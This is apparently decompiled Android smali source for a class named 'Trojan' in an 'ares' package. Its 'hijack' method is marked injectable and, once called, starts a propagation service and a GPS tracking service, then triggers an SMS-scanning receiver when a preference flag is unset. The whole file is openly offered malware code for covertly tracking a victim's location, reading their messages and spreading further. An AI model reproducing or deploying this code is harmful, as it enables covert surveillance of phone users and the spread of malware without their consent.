.class public Landroid/ares/Trojan;
.super Landroid/app/Activity;
.source "Trojan.java"


# static fields
.field public static final DEV_MODE:Z = true

.field public static final TAG:Ljava/lang/String; = "::trace"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static hijack(Landroid/content/Context;)V #injectable
    .registers 7
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const-wide/16 v4, -0x1

    .line 15
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 17
    .local v0, "prefs":Landroid/content/SharedPreferences;
    new-instance v1, Landroid/content/Intent;

    const-class v2, Landroid/ares/Propagate;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 18
    new-instance v1, Landroid/content/Intent;

    const-class v2, Landroid/ares/GPSTracker;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 21
    const-string v1, "SMSScan"

    invoke-interface {v0, v1, v4, v5}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    cmp-long v1, v2, v4

    if-nez v1, :cond_2e

    .line 22
    new-instance v1, Landroid/content/Intent;

    const-class v2, Landroid/ares/ScanSMSReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 23
    :cond_2e
    return-void
.end method
